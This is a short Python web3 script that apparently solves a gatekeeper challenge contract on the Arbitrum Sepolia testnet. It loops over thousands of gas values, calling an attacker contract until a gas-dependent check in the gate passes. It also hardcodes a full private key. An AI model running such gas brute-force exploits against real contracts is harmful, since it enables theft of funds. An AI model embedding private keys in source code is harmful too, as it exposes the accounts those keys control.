from web3 import Web3
from eth_account.account import Account, SignedTransaction
import time

provider_url = "https://sepolia-rollup.arbitrum.io/rpc"
w3 = Web3(Web3.HTTPProvider(provider_url))

private_key = "0x4c93e99df964f043149b68ae9d6c994e684f0cacec41becbd5da0a082629684c"
account = w3.eth.account.from_key(private_key)


address = "0xc28b2a516e5F3Af0b6d2b52ee35c8ddC189B3B51"
abi = """[
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "add",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "gasSend",
				"type": "uint256"
			}
		],
		"name": "sendTo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	}
]"""
contract_instance = w3.eth.contract(address=address, abi=abi)
# print(w3.eth.accounts)


def verify():
    verify_add = "0x9a3bC7918B3a6Dc9bC85a18f716ae399D22717bC"
    verify_abi = """[
	{
		"inputs": [
			{
				"internalType": "bytes8",
				"name": "_gateKey",
				"type": "bytes8"
			}
		],
		"name": "enter",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "entrant",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]"""
    verify_contract = w3.eth.contract(address=verify_add, abi=verify_abi)
    func = getattr(verify_contract.functions, 'entrant')()
    result = func.call()
    return result

for gas in range(90527,90527+8191):
    time.sleep(0.2)
    func = getattr(contract_instance.functions, 'sendTo')("0x9a3bC7918B3a6Dc9bC85a18f716ae399D22717bC",gas)
    tx = func.build_transaction({
        'nonce': w3.eth.get_transaction_count(account.address),
        'value': 0,
        'gas': 1000000,
        'gasPrice': w3.eth.gas_price})
    sign_tx: SignedTransaction = Account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(sign_tx.raw_transaction)
    # print(tx_hash.hex())
    if verify() != "0x0000000000000000000000000000000000000000":
        print("Success")

